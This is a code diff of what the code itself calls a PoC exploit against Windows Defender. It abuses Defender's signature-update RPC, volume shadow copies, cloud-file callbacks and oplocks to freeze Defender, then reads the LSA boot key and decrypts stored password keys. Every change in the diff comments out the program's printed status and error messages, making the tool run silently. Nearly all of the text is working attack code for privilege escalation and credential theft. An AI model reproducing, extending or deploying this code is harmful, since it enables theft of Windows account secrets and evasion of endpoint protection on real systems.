@@ -12,6 +12,7 @@
 #include <winternl.h>
 #include <conio.h>
 #include <Shlwapi.h>
+#include <vector>
 #include <ktmw32.h>
 #include <wuapi.h>
 #include <ntstatus.h>
@@ -268,20 +269,20 @@ void CallWD(WDRPCWorkerThreadArgs* args)
 	RPC_WSTR StringBinding;
 	if (RpcStringBindingComposeW(MS_WD_UUID, (RPC_WSTR)L"ncalrpc", NULL, (RPC_WSTR)L"IMpService77BDAF73-B396-481F-9042-AD358843EC24", NULL, &StringBinding) != RPC_S_OK)
 	{
-		printf("Unexpected error while building an RPC binding from string !!!");
+		//printf("Unexpected error while building an RPC binding from string !!!");
 		RaiseExceptionInThread(args->hntfythread);
 		return;
 	}
 	RPC_BINDING_HANDLE bindhandle = 0;
 	if (RpcBindingFromStringBindingW(StringBinding, &bindhandle) != RPC_S_OK)
 	{
-		printf("Failed to connect to windows defender RPC port !!!");
+		//printf("Failed to connect to windows defender RPC port !!!");
 		RaiseExceptionInThread(args->hntfythread);
 		return;
 	}
 	// PoC might fail here with 0x8050A003 from time to time, this means the update that the PoC is attempting to perform isn't the right one for this code, bail out anyway and wait for the right update.
 	error_status_t errstat = 0;
-	printf("Calling ServerMpUpdateEngineSignature...\n");
+	//printf("Calling ServerMpUpdateEngineSignature...\n");
 	RPC_STATUS stat = Proc42_ServerMpUpdateEngineSignature(bindhandle, NULL, args->dirpath, &errstat);
 	args->res = stat;
 	if (args->hevent)
@@ -401,7 +402,7 @@ INT_PTR CUST_FNFDINOTIFY(
 	FDINOTIFICATIONTYPE fdinotify, PFDINOTIFICATION    pfdin
 ) {
 
-	//printf("_FNFDINOTIFY : %d\n", fdinotify);
+	////printf("_FNFDINOTIFY : %d\n", fdinotify);
 	wchar_t newfile[MAX_PATH] = { 0 };
 	wchar_t filename[MAX_PATH] = { 0 };
 	HANDLE hfile = NULL;
@@ -639,11 +640,11 @@ UpdateFiles* GetUpdateFiles(int* filecount = NULL)
 	DWORD nbytes = 0;
 
 
-	printf("Downloading updates...\n");
+	//printf("Downloading updates...\n");
 	hint = InternetOpen(L"Chrome/141.0.0.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, NULL);
 	if (!hint)
 	{
-		printf("Failed to open internet, error : %d", GetLastError());
+		//printf("Failed to open internet, error : %d", GetLastError());
 		goto cleanup;
 	}
 
@@ -651,14 +652,14 @@ UpdateFiles* GetUpdateFiles(int* filecount = NULL)
 	//InternetCloseHandle(hint);
 	if (!hint2)
 	{
-		printf("Failed to open internet URL, error : %d", GetLastError());
+		//printf("Failed to open internet URL, error : %d", GetLastError());
 		goto cleanup;
 	}
 
 	res2 = HttpQueryInfo(hint2, HTTP_QUERY_CONTENT_LENGTH, data, &sz, &index);
 	if (!res2)
 	{
-		printf("Failed to query update size, error : %d", GetLastError());
+		//printf("Failed to query update size, error : %d", GetLastError());
 		goto cleanup;
 	}
 
@@ -671,7 +672,7 @@ UpdateFiles* GetUpdateFiles(int* filecount = NULL)
 	exebuff = malloc(sz);
 	if (!exebuff)
 	{
-		printf("Failed to allocate memory to download file !!!");
+		//printf("Failed to allocate memory to download file !!!");
 		goto cleanup;
 	}
 	ZeroMemory(exebuff, sz);
@@ -679,24 +680,24 @@ UpdateFiles* GetUpdateFiles(int* filecount = NULL)
 	if (!InternetReadFile(hint2, exebuff, sz, &readsz) || readsz != sz)
 	{
 
-		printf("Failed to download update from internet, error : %d", GetLastError());
+		//printf("Failed to download update from internet, error : %d", GetLastError());
 		goto cleanup;
 	}
 	InternetCloseHandle(hint);
 	hint = NULL;
 	InternetCloseHandle(hint2);
 	hint2 = NULL;
-	printf("Done.\n");
+	//printf("Done.\n");
 	mappedbuff = GetCabFileFromBuff((PIMAGE_DOS_HEADER)exebuff, sz, &ressz);
 
 
 
 	if (!mappedbuff)
 	{
-		printf("Failed to retrieve cabinet file from downloaded file.\n");
+		//printf("Failed to retrieve cabinet file from downloaded file.\n");
 		goto cleanup;
 	}
-	printf("Cabinet file mapped at 0x%p\n", mappedbuff);
+	//printf("Cabinet file mapped at 0x%p\n", mappedbuff);
 
 
 
@@ -704,11 +705,11 @@ UpdateFiles* GetUpdateFiles(int* filecount = NULL)
 	cabbuff2 = mappedbuff;
 	cabbuffsz = ressz;
 
-	printf("Extracting cab file content...\n");
+	//printf("Extracting cab file content...\n");
 	hcabctx = FDICreate((PFNALLOC)CUST_FNALLOC, CUST_FNFREE, (PFNOPEN)CUST_FNOPEN, (PFNREAD)CUST_FNREAD, (PFNWRITE)CUST_FNWRITE, (PFNCLOSE)CUST_FNCLOSE, (PFNSEEK)CUST_FNSEEK, cpuUNKNOWN, &erfstruct);
 	if (!hcabctx)
 	{
-		printf("Failed to create cab context, error : 0x%x", erfstruct.erfOper);
+		//printf("Failed to create cab context, error : 0x%x", erfstruct.erfOper);
 		goto cleanup;
 	}
 
@@ -717,7 +718,7 @@ UpdateFiles* GetUpdateFiles(int* filecount = NULL)
 	extractres = FDICopy(hcabctx, (char*)"\\update.cab", (char*)"C:\\temp", NULL, (PFNFDINOTIFY)CUST_FNFDINOTIFY, NULL, &CabOpArgs);
 	if (!extractres)
 	{
-		printf("Failed to extract cab file, error : 0x%x", erfstruct.erfOper);
+		//printf("Failed to extract cab file, error : 0x%x", erfstruct.erfOper);
 		goto cleanup;
 	}
 	FDIDestroy(hcabctx);
@@ -725,7 +726,7 @@ UpdateFiles* GetUpdateFiles(int* filecount = NULL)
 
 	if (!CabOpArgs)
 	{
-		printf("Unexpected empty buffer after extracting cab file.\n");
+		//printf("Unexpected empty buffer after extracting cab file.\n");
 		return NULL;
 	}
 
@@ -752,7 +753,7 @@ UpdateFiles* GetUpdateFiles(int* filecount = NULL)
 		}
 
 	}
-	printf("Cab file content extracted.\n");
+	//printf("Cab file content extracted.\n");
 
 
 cleanup:
@@ -803,7 +804,7 @@ bool CheckForWDUpdates(wchar_t* updatetitle, bool* criterr)
 	IUpdate* upd = 0;
 	bool comini = CoInitialize(NULL) == 0;
 	if (!comini) {
-		printf("Failed to initialize COM\n");
+		//printf("Failed to initialize COM\n");
 		*criterr = true;
 		return false;
 	}
@@ -815,63 +816,63 @@ bool CheckForWDUpdates(wchar_t* updatetitle, bool* criterr)
 
 	if (!updsess)
 	{
-		printf("CoCreateInstance returned a NULL pointer.\n");
+		//printf("CoCreateInstance returned a NULL pointer.\n");
 		*criterr = true;
 		goto cleanup;
 	}
-	//printf("CoCreateInstance : 0x%p\n", updsess);
+	////printf("CoCreateInstance : 0x%p\n", updsess);
 
 
 	hr = updsess->CreateUpdateSearcher(&updsrch);
 	if (hr)
 	{
-		printf("IUpdateSearcher->CreateUpdateSearcher failed with error : 0x%0.X", hr);
+		//printf("IUpdateSearcher->CreateUpdateSearcher failed with error : 0x%0.X", hr);
 		*criterr = true;
 		goto cleanup;
 	}
 
 	if (!updsrch)
 	{
-		printf("IUpdateSearcher->CreateUpdateSearcher returned a NULL pointer.\n");
+		//printf("IUpdateSearcher->CreateUpdateSearcher returned a NULL pointer.\n");
 		*criterr = true;
 		goto cleanup;
 	}
-	//printf("IUpdateSearcher->CreateUpdateSearcher : 0x%p\n", updsrch);
-	//printf("Checking for updates, please wait...\n");
+	////printf("IUpdateSearcher->CreateUpdateSearcher : 0x%p\n", updsrch);
+	////printf("Checking for updates, please wait...\n");
 	hr = updsrch->Search(SysAllocString(L""), &srchres);
 	if (hr)
 	{
-		printf("ISearchResult->Search failed with error : 0x%0.X", hr);
+		//printf("ISearchResult->Search failed with error : 0x%0.X", hr);
 		*criterr = true;
 		goto cleanup;
 	}
-	//printf("ISearchResult->Search : 0x%p\n", srchres);
+	////printf("ISearchResult->Search : 0x%p\n", srchres);
 
 	hr = srchres->get_Updates(&updcollection);
 	if (hr)
 	{
-		printf("IUpdateCollection->get_Updates failed with error : 0x%0.X", hr);
+		//printf("IUpdateCollection->get_Updates failed with error : 0x%0.X", hr);
 		*criterr = true;
 		goto cleanup;
 	}
 
 	if (!updcollection)
 	{
-		printf("IUpdateCollection->get_Updates returned a NULL pointer.\n");
+		//printf("IUpdateCollection->get_Updates returned a NULL pointer.\n");
 		*criterr = true;
 		goto cleanup;
 	}
-	//printf("IUpdateCollection->get_Updates : 0x%p\n", updcollection);
+	////printf("IUpdateCollection->get_Updates : 0x%p\n", updcollection);
 
 
 	hr = updcollection->get_Count(&updnum);
 	if (hr)
 	{
-		printf("IUpdateCollection->get_Count failed with error : 0x%0.X", hr);
+		//printf("IUpdateCollection->get_Count failed with error : 0x%0.X", hr);
 		*criterr = true;
 		goto cleanup;
 	}
-	//printf("Updates count : %d\n", updnum);
+	////printf("Updates count : %d\n", updnum);
 
 	for (LONG i = 0; i < updnum; i++)
 	{
@@ -883,54 +884,54 @@ bool CheckForWDUpdates(wchar_t* updatetitle, bool* criterr)
 		title = 0;
 		desc = 0;
 		catname = 0;
-		//printf("_________________________________________\n");
+		////printf("_________________________________________\n");
 		bool IsWdUdpate = false;
 		bool IsSigUpdate = false;
 		hr = updcollection->get_Item(i, &upd);
 		if (hr)
 		{
-			printf("IUpdateCollection->get_Item failed with error : 0x%0.X", hr);
+			//printf("IUpdateCollection->get_Item failed with error : 0x%0.X", hr);
 			*criterr = true;
 			goto cleanup;
 		}
 		if (!upd)
 		{
-			printf("IUpdateCollection->get_Item returned a NULL pointer.\n");
+			//printf("IUpdateCollection->get_Item returned a NULL pointer.\n");
 			*criterr = true;
 			goto cleanup;
 		}
-		//printf("Update number : %d\n", i + 1);
+		////printf("Update number : %d\n", i + 1);
 
 		hr = upd->get_Title(&title);
 		if (hr)
 		{
-			printf("IUpdateCollection->get_Title failed with error : 0x%0.X", hr);
+			//printf("IUpdateCollection->get_Title failed with error : 0x%0.X", hr);
 			continue;
 		}
 		if (!title)
 		{
-			printf("IUpdateCollection->get_Item returned a NULL pointer.\n");
+			//printf("IUpdateCollection->get_Item returned a NULL pointer.\n");
 			continue;
 		}
 		title[SysStringLen(title)] = NULL;
-		//printf("Title : %ws\n", title);
+		////printf("Title : %ws\n", title);
 
 		/*
 		desc = 0;
 		upd->get_Description(&desc);
 		if (!desc)
 		{
-			printf("IUpdateCollection->get_Item returned a NULL pointer.\n");
+			//printf("IUpdateCollection->get_Item returned a NULL pointer.\n");
 			continue;
 		}
 		desc[SysStringLen(desc)] = NULL;
-		printf("Description : %ws\n", desc);
+		//printf("Description : %ws\n", desc);
 		*/
 		catcoll = 0;
 		hr = upd->get_Categories(&catcoll);
 		if (!catcoll)
 		{
-			printf("IUpdateCollection->get_Categories returned a NULL pointer.\n");
+			//printf("IUpdateCollection->get_Categories returned a NULL pointer.\n");
 			continue;
 		}
 		LONG catcount = 0;
@@ -941,13 +942,13 @@ bool CheckForWDUpdates(wchar_t* updatetitle, bool* criterr)
 			hr = catcoll->get_Item(j, &cat);
 			if (!cat)
 			{
-				printf("ICategoryCollection->get_Item returned NULL pointer.\n");
+				//printf("ICategoryCollection->get_Item returned NULL pointer.\n");
 				continue;
 			}
 			catname = 0;
 			cat->get_Name(&catname);
 			catname[SysStringLen(catname)] = NULL;
-			//printf("Category name : %ws\n", catname);
+			////printf("Category name : %ws\n", catname);
 			if (catname)
 			{
 				if (!IsWdUdpate)
@@ -976,12 +977,12 @@ bool CheckForWDUpdates(wchar_t* updatetitle, bool* criterr)
 
 			if (IsPlatformUpdate)
 			{
-				printf("Skipping platform update: %ws\n", title);
+				//printf("Skipping platform update: %ws\n", title);
 				updatesfound = false;
 			}
 			else if (!IsSignatureUpdate)
 			{
-				printf("Skipping non-signature update: %ws\n", title);
+				//printf("Skipping non-signature update: %ws\n", title);
 				updatesfound = false;
 			}
 		}
@@ -1066,7 +1067,7 @@ LLShadowVolumeNames* RetrieveCurrentVSSList(HANDLE hobjdir, bool* criticalerr, i
 	OBJECT_DIRECTORY_INFORMATION* objdirinfo = (OBJECT_DIRECTORY_INFORMATION*)malloc(reqsz);
 	if (!objdirinfo)
 	{
-		printf("Failed to allocate required buffer to query object manager directory.\n");
+		//printf("Failed to allocate required buffer to query object manager directory.\n");
 		*criticalerr = true;
 		*errorcode = ERROR_NOT_ENOUGH_MEMORY;
 		return NULL;
@@ -1080,7 +1081,7 @@ LLShadowVolumeNames* RetrieveCurrentVSSList(HANDLE hobjdir, bool* criticalerr, i
 			break;
 		else if (stat != STATUS_MORE_ENTRIES)
 		{
-			printf("NtQueryDirectoryObject failed with 0x%0.8X\n", stat);
+			//printf("NtQueryDirectoryObject failed with 0x%0.8X\n", stat);
 			*criticalerr = true;
 			*errorcode = RtlNtStatusToDosError(stat);
 			return NULL;
@@ -1091,7 +1092,7 @@ LLShadowVolumeNames* RetrieveCurrentVSSList(HANDLE hobjdir, bool* criticalerr, i
 		objdirinfo = (OBJECT_DIRECTORY_INFORMATION*)malloc(reqsz);
 		if (!objdirinfo)
 		{
-			printf("Failed to allocate required buffer to query object manager directory.\n");
+			//printf("Failed to allocate required buffer to query object manager directory.\n");
 			*criticalerr = true;
 			*errorcode = ERROR_NOT_ENOUGH_MEMORY;
 			return NULL;
@@ -1122,7 +1123,7 @@ LLShadowVolumeNames* RetrieveCurrentVSSList(HANDLE hobjdir, bool* criticalerr, i
 						LLVSScurrent->next = (LLShadowVolumeNames*)malloc(sizeof(LLShadowVolumeNames));
 						if (!LLVSScurrent->next)
 						{
-							printf("Failed to allocate memory.\n");
+							//printf("Failed to allocate memory.\n");
 							*criticalerr = true;
 							*errorcode = ERROR_NOT_ENOUGH_MEMORY;
 							DestroyVSSNamesList(LLVSSfirst);
@@ -1134,7 +1135,7 @@ LLShadowVolumeNames* RetrieveCurrentVSSList(HANDLE hobjdir, bool* criticalerr, i
 						LLVSScurrent->name = (wchar_t*)malloc(objdirinfo[i].Name.Length + sizeof(wchar_t));
 						if (!LLVSScurrent->name)
 						{
-							printf("Failed to allocate memory !!!\n");
+							//printf("Failed to allocate memory !!!\n");
 							*errorcode = ERROR_NOT_ENOUGH_MEMORY;
 							*criticalerr = true;
 							DestroyVSSNamesList(LLVSSfirst);
@@ -1149,7 +1150,7 @@ LLShadowVolumeNames* RetrieveCurrentVSSList(HANDLE hobjdir, bool* criticalerr, i
 						LLVSSfirst = (LLShadowVolumeNames*)malloc(sizeof(LLShadowVolumeNames));
 						if (!LLVSSfirst)
 						{
-							printf("Failed to allocate memory.\n");
+							//printf("Failed to allocate memory.\n");
 							*errorcode = ERROR_NOT_ENOUGH_MEMORY;
 							*criticalerr = true;
 							DestroyVSSNamesList(LLVSSfirst);
@@ -1161,7 +1162,7 @@ LLShadowVolumeNames* RetrieveCurrentVSSList(HANDLE hobjdir, bool* criticalerr, i
 						LLVSScurrent->name = (wchar_t*)malloc(objdirinfo[i].Name.Length + sizeof(wchar_t));
 						if (!LLVSScurrent->name)
 						{
-							printf("Failed to allocate memory !!!\n");
+							//printf("Failed to allocate memory !!!\n");
 							*errorcode = ERROR_NOT_ENOUGH_MEMORY;
 							*criticalerr = true;
 							DestroyVSSNamesList(LLVSSfirst);
@@ -1217,14 +1218,14 @@ DWORD WINAPI ShadowCopyFinderThread(void* fullvsspath)
 	stat = _NtOpenDirectoryObject(&hobjdir, 0x0001, &objattr);
 	if (stat)
 	{
-		printf("Failed to open object manager directory, error : 0x%0.8X", stat);
+		//printf("Failed to open object manager directory, error : 0x%0.8X", stat);
 		retval = RtlNtStatusToDosError(stat);
 		return retval;
 	}
 	void* emptybuff = malloc(sizeof(OBJECT_DIRECTORY_INFORMATION));
 	if (!emptybuff)
 	{
-		printf("Failed to allocate memory !!!");
+		//printf("Failed to allocate memory !!!");
 		retval = ERROR_NOT_ENOUGH_MEMORY;
 		goto cleanup;
 	}
@@ -1235,16 +1236,16 @@ DWORD WINAPI ShadowCopyFinderThread(void* fullvsspath)
 
 	if (criterr)
 	{
-		printf("Unexpected error while listing current volume shadow copy volumes\n");
+		//printf("Unexpected error while listing current volume shadow copy volumes\n");
 		goto cleanup;
 	}
 	if (!vsinitial)
 	{
-		printf("No volume shadow copies were found.\n");
+		//printf("No volume shadow copies were found.\n");
 	}
 	else
 	{
-		printf("Found %d volume shadow copies\n", vscnum);
+		//printf("Found %d volume shadow copies\n", vscnum);
 	}
 
 
@@ -1259,7 +1260,7 @@ scanagain:
 		objdirinfo = (OBJECT_DIRECTORY_INFORMATION*)malloc(reqsz);
 		if (!objdirinfo)
 		{
-			printf("Failed to allocate required buffer to query object manager directory.\n");
+			//printf("Failed to allocate required buffer to query object manager directory.\n");
 			retval = ERROR_NOT_ENOUGH_MEMORY;
 			goto cleanup;
 		}
@@ -1271,7 +1272,7 @@ scanagain:
 			break;
 		else if (stat != STATUS_MORE_ENTRIES)
 		{
-			printf("NtQueryDirectoryObject failed with 0x%0.8X\n", stat);
+			//printf("NtQueryDirectoryObject failed with 0x%0.8X\n", stat);
 			retval = RtlNtStatusToDosError(stat);
 			goto cleanup;
 		}
@@ -1332,7 +1333,7 @@ scanagain:
 
 
 
-	printf("New volume shadow copy detected : %ws\n", newvsspath);
+	//printf("New volume shadow copy detected : %ws\n", newvsspath);
 
 
 	wcscpy(vsswinpath, newvsspath);
@@ -1346,13 +1347,13 @@ retry:
 		goto retry;
 	if (stat)
 	{
-		printf("Failed to open volume shadow copy, error : 0x%0.8X\n", stat);
+		//printf("Failed to open volume shadow copy, error : 0x%0.8X\n", stat);
 		retval = RtlNtStatusToDosError(stat);
 		goto cleanup;
 
 
 	}
-	printf("Successfully accessed volume shadow copy.\n");
+	//printf("Successfully accessed volume shadow copy.\n");
 	CloseHandle(hlk);
 	if (fullvsspath)
 		wcscpy((wchar_t*)fullvsspath, newvsspath);
@@ -1400,17 +1401,17 @@ void CfCallbackFetchPlaceHolders(
 	_In_ CONST CF_CALLBACK_PARAMETERS* CallbackParameters
 ) {
 
-	printf("CfCallbackFetchPlaceHolders triggered !\n");
+	//printf("CfCallbackFetchPlaceHolders triggered !\n");
 
 	CF_PROCESS_INFO* cpi = CallbackInfo->ProcessInfo;
 	wchar_t* procname = PathFindFileName(cpi->ImagePath);
-	printf("Directory query from %ws\n", procname);
+	//printf("Directory query from %ws\n", procname);
 	if (GetWDPID() == cpi->ProcessId)
 	{
 		cldcallbackctx* ctx = (cldcallbackctx*)CallbackInfo->CallbackContext;
 		SetEvent(ctx->hnotifywdaccess);;
 
-		printf("Defender flagged.\n");
+		//printf("Defender flagged.\n");
 		CF_OPERATION_INFO cfopinfo = { 0 };
 		cfopinfo.StructSize = sizeof(CF_OPERATION_INFO);
 		cfopinfo.Type = CF_OPERATION_TYPE_TRANSFER_PLACEHOLDERS;
@@ -1455,7 +1456,7 @@ void CfCallbackFetchPlaceHolders(
 
 		WaitForSingleObject(ctx->hnotifylockcreated, INFINITE);
 		HRESULT hs = CfExecute(&cfopinfo, &cfopparams);
-		printf("CfExecute returned : 0x%0.8X\n", hs);
+		//printf("CfExecute returned : 0x%0.8X\n", hs);
 		return;
 	}
 	CF_OPERATION_INFO cfopinfo = { 0 };
@@ -1473,7 +1474,7 @@ void CfCallbackFetchPlaceHolders(
 	cfopparams.TransferPlaceholders.Flags = CF_OPERATION_TRANSFER_PLACEHOLDERS_FLAG_NONE;
 	cfopparams.TransferPlaceholders.PlaceholderArray = { 0 };
 	HRESULT hs = CfExecute(&cfopinfo, &cfopparams);
-	printf("CfExecute : 0x%0.8X\n", hs);
+	//printf("CfExecute : 0x%0.8X\n", hs);
 
 	return;
 
@@ -1526,7 +1527,7 @@ DWORD WINAPI FreezeVSS(void* arg)
 	callbackctx.hnotifylockcreated = CreateEvent(NULL, FALSE, FALSE, NULL);
 	if (!callbackctx.hnotifylockcreated || !callbackctx.hnotifywdaccess)
 	{
-		printf("Failed to create event, error : %d", GetLastError());
+		//printf("Failed to create event, error : %d", GetLastError());
 		retval = GetLastError();
 		goto cleanup;
 	}
@@ -1535,7 +1536,7 @@ DWORD WINAPI FreezeVSS(void* arg)
 	hlock = CreateFile(lockfile, GENERIC_ALL, FILE_SHARE_READ, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED | FILE_FLAG_DELETE_ON_CLOSE, NULL);
 	if (!hlock || hlock == INVALID_HANDLE_VALUE)
 	{
-		printf("Failed to create lock file %ws error : %d", lockfile, GetLastError());
+		//printf("Failed to create lock file %ws error : %d", lockfile, GetLastError());
 		retval = GetLastError();
 		goto cleanup;
 	}
@@ -1545,7 +1546,7 @@ DWORD WINAPI FreezeVSS(void* arg)
 	hs = CfRegisterSyncRoot(syncroot, &cfreg, &syncpolicy, CF_REGISTER_FLAG_NONE);
 	if (hs)
 	{
-		printf("Failed to register syncroot, hr = 0x%0.8X\n", hs);
+		//printf("Failed to register syncroot, hr = 0x%0.8X\n", hs);
 		retval = ERROR_UNIDENTIFIED_ERROR;
 		goto cleanup;
 	}
@@ -1553,7 +1554,7 @@ DWORD WINAPI FreezeVSS(void* arg)
 	hs = CfConnectSyncRoot(syncroot, callbackreg, &callbackctx, CF_CONNECT_FLAG_REQUIRE_PROCESS_INFO | CF_CONNECT_FLAG_REQUIRE_FULL_FILE_PATH, &cfkey);
 	if (hs)
 	{
-		printf("Failed to connect to syncroot, hr = 0x%0.8X\n", hs);
+		//printf("Failed to connect to syncroot, hr = 0x%0.8X\n", hs);
 		retval = ERROR_UNIDENTIFIED_ERROR;
 		goto cleanup;
 	}
@@ -1562,14 +1563,14 @@ DWORD WINAPI FreezeVSS(void* arg)
 		args->hlock = NULL;
 	}
 
-	printf("Waiting for callback...\n");
+	//printf("Waiting for callback...\n");
 
 	WaitForSingleObject(callbackctx.hnotifywdaccess, INFINITE);
 
 	ovd.hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
 	if (!ovd.hEvent)
 	{
-		printf("Failed to create event, error : %d\n", GetLastError());
+		//printf("Failed to create event, error : %d\n", GetLastError());
 		retval = GetLastError();
 		goto cleanup;
 	}
@@ -1577,17 +1578,17 @@ DWORD WINAPI FreezeVSS(void* arg)
 
 	if (GetLastError() != ERROR_IO_PENDING)
 	{
-		printf("Failed to request a batch oplock on the update file, error : %d", GetLastError());
+		//printf("Failed to request a batch oplock on the update file, error : %d", GetLastError());
 		retval = GetLastError();
 		goto cleanup;
 	}
 	SetEvent(callbackctx.hnotifylockcreated);
 
-	printf("Waiting for oplock to trigger...\n");
+	//printf("Waiting for oplock to trigger...\n");
 
 	GetOverlappedResult(hlock, &ovd, &nwf, TRUE);
 
-	printf("WD is frozen and the new VSS can be used.\n");
+	//printf("WD is frozen and the new VSS can be used.\n");
 
 	SetEvent(args->hvssready);
 
@@ -1654,7 +1655,7 @@ bool TriggerWDForVS(HANDLE hreleaseevent,wchar_t* fullvsspath)
 	hthread = CreateThread(NULL, NULL, ShadowCopyFinderThread, (void*)fullvsspath, NULL, &tid);
 	if (!hthread)
 	{
-		printf("Failed to create worker thread, error : %d", GetLastError());
+		//printf("Failed to create worker thread, error : %d", GetLastError());
 		retval = false;
 		goto cleanup;
 	}
@@ -1662,7 +1663,7 @@ bool TriggerWDForVS(HANDLE hreleaseevent,wchar_t* fullvsspath)
 	dircreated = CreateDirectory(workdir, NULL);
 	if (!dircreated)
 	{
-		printf("Failed to create working directory, error : %d\n",GetLastError());
+		//printf("Failed to create working directory, error : %d\n",GetLastError());
 		retval = false;
 		goto cleanup;
 	}
@@ -1670,7 +1671,7 @@ bool TriggerWDForVS(HANDLE hreleaseevent,wchar_t* fullvsspath)
 	hfile = CreateFile(eicarfilepath, GENERIC_READ | GENERIC_WRITE | DELETE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_DELETE_ON_CLOSE, NULL);
 	if (!hfile || hfile == INVALID_HANDLE_VALUE)
 	{
-		printf("Failed to create eicar test file, error : %d\n", GetLastError());
+		//printf("Failed to create eicar test file, error : %d\n", GetLastError());
 		retval = false;
 		goto cleanup;
 	}
@@ -1679,7 +1680,7 @@ bool TriggerWDForVS(HANDLE hreleaseevent,wchar_t* fullvsspath)
 	
 	if (!WriteFile(hfile, eicar, sizeof(eicar) - 1, &nwf, NULL))
 	{
-		printf("Failed to write eicar test file, error : %d\n", GetLastError());
+		//printf("Failed to write eicar test file, error : %d\n", GetLastError());
 		retval = false;
 		goto cleanup;
 	}
@@ -1688,7 +1689,7 @@ bool TriggerWDForVS(HANDLE hreleaseevent,wchar_t* fullvsspath)
 	hlock = CreateFile(rstmgr, GENERIC_READ | SYNCHRONIZE, NULL, NULL, OPEN_EXISTING, FILE_FLAG_OVERLAPPED, NULL);
 	if (!hlock || hlock == INVALID_HANDLE_VALUE)
 	{
-		printf("Failed to open restart manager dll for exclusive access, error : %d\nTry again later.\n", GetLastError());
+		//printf("Failed to open restart manager dll for exclusive access, error : %d\nTry again later.\n", GetLastError());
 		retval = false;
 		goto cleanup;
 	}
@@ -1697,7 +1698,7 @@ bool TriggerWDForVS(HANDLE hreleaseevent,wchar_t* fullvsspath)
 	ovd.hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
 	if (!ovd.hEvent)
 	{
-		printf("Failed to create event object with error : %d !!!!\n", GetLastError());
+		//printf("Failed to create event object with error : %d !!!!\n", GetLastError());
 		retval = false;
 		goto cleanup;
 	}
@@ -1707,7 +1708,7 @@ bool TriggerWDForVS(HANDLE hreleaseevent,wchar_t* fullvsspath)
 
 	if (GetLastError() != ERROR_IO_PENDING)
 	{
-		printf("Failed to request a batch oplock on the update file, error : %d", GetLastError());
+		//printf("Failed to request a batch oplock on the update file, error : %d", GetLastError());
 		retval = false;
 		goto cleanup;
 	}
@@ -1717,25 +1718,25 @@ bool TriggerWDForVS(HANDLE hreleaseevent,wchar_t* fullvsspath)
 	if (trigger && trigger != INVALID_HANDLE_VALUE)
 		CloseHandle(trigger);
 
-	printf("Waiting for oplock to trigger...\n");
+	//printf("Waiting for oplock to trigger...\n");
 	GetOverlappedResult(hlock, &ovd, &nwf, TRUE);
-	printf("Oplock triggered.\n");
+	//printf("Oplock triggered.\n");
 
 	// Wait for the VSS finder thread to finish before checking its exit code.
 	// Without this, GetExitCodeThread can return STILL_ACTIVE (259) if the
 	// thread is between its last print and its return statement.
-	printf("Waiting for VSS finder thread to complete...\n");
+	//printf("Waiting for VSS finder thread to complete...\n");
 	WaitForSingleObject(hthread, 30000);
 
 	if (!GetExitCodeThread(hthread, &exitcode))
 	{
-		printf("Unexpected error while getting worker thread exit code");
+		//printf("Unexpected error while getting worker thread exit code");
 		retval = false;
 		goto cleanup;
 	}
 	if (exitcode)
 	{
-		printf("Failed to get new volume shadow copy path, thread exit code: %d\n", exitcode);
+		//printf("Failed to get new volume shadow copy path, thread exit code: %d\n", exitcode);
 		retval = false;
 		goto cleanup;
 
@@ -1748,7 +1749,7 @@ bool TriggerWDForVS(HANDLE hreleaseevent,wchar_t* fullvsspath)
 	
 	hthread2 = CreateThread(NULL, NULL, FreezeVSS, &cldthreadargs, NULL, &tid);
 	if (!hthread2) {
-		printf("Unable to create worker thread, error : %d", GetLastError());
+		//printf("Unable to create worker thread, error : %d", GetLastError());
 		retval = false;
 		goto cleanup;
 	}
@@ -1761,7 +1762,7 @@ bool TriggerWDForVS(HANDLE hreleaseevent,wchar_t* fullvsspath)
 
 	if (waitres - WAIT_OBJECT_0 == 0)
 	{
-		printf("Unable to freeze WD, thread exited prematurely.\n");
+		//printf("Unable to freeze WD, thread exited prematurely.\n");
 		retval = false;
 	}
 
@@ -1795,13 +1796,13 @@ cleanup:
 void hex_string_to_bytes(const char* hex_string, unsigned char* byte_array, size_t max_len) {
 	size_t len = strlen(hex_string);
 	if (len % 2 != 0) {
-		fprintf(stderr, "Error: Hex string length must be even.\n");
+		//fprintf(stderr, "Error: Hex string length must be even.\n");
 		return;
 	}
 
 	size_t byte_len = len / 2;
 	if (byte_len > max_len) {
-		fprintf(stderr, "Error: Output buffer too small.\n");
+		//fprintf(stderr, "Error: Output buffer too small.\n");
 		return;
 	}
 
@@ -1809,7 +1810,7 @@ void hex_string_to_bytes(const char* hex_string, unsigned char* byte_array, size
 		// Read two hex characters and convert them to an unsigned int
 		unsigned int byte_val;
 		if (sscanf(&hex_string[i * 2], "%2x", &byte_val) != 1) {
-			fprintf(stderr, "Error: Invalid hex character in string.\n");
+			//fprintf(stderr, "Error: Invalid hex character in string.\n");
 			return;
 		}
 		byte_array[i] = (unsigned char)byte_val;
@@ -1838,12 +1839,12 @@ bool GetLSASecretKey(unsigned char bootkeybytes[16])
 		index += retsz;
 		RegCloseKey(hbootkey);
 	}
-	//printf("%s\n", data);
+	////printf("%s\n", data);
 	RegCloseKey(hlsa);
 
 	if (strlen(data) < 16)
 	{
-		printf("Boot key mismatch.");
+		//printf("Boot key mismatch.");
 		return 1;
 	}
 
@@ -1980,7 +1981,7 @@ void* UnprotectPasswordEncryptionKeyAES(char* data, char* lsaKey, int* keysz)
 
 	if (memcmp(hash256, hash, sizeof(hash256)) != 0)
 	{
-		printf("Invalid AES password key.\n");
+		//printf("Invalid AES password key.\n");
 		free(hash);
 		free(pek);
 		return NULL;
@@ -2091,18 +2092,18 @@ void* UnprotectDES(char* key, int keysz, char* ciphertext, int ciphertextsz, int
 	/*
 	DWORD mode = CRYPT_MODE_ECB;
 	CryptSetKeyParam(hcryptkey, KP_MODE, (const BYTE*)&mode, NULL);
-	printf("GetLastError : %x\n", GetLastError());
+	//printf("GetLastError : %x\n", GetLastError());
 
 	DWORD retsz = enclen;
 
 	CryptDecrypt(hcryptkey, NULL, TRUE, CRYPT_DECRYPT_RSA_NO_PADDING_CHECK, (BYTE*)decrypted, &retsz);
-	printf("GetLastError : %x\n", GetLastError());
+	//printf("GetLastError : %x\n", GetLastError());
 	*/
 	/*
 	OSSL_PROVIDER* legacy = OSSL_PROVIDER_load(NULL, "legacy");
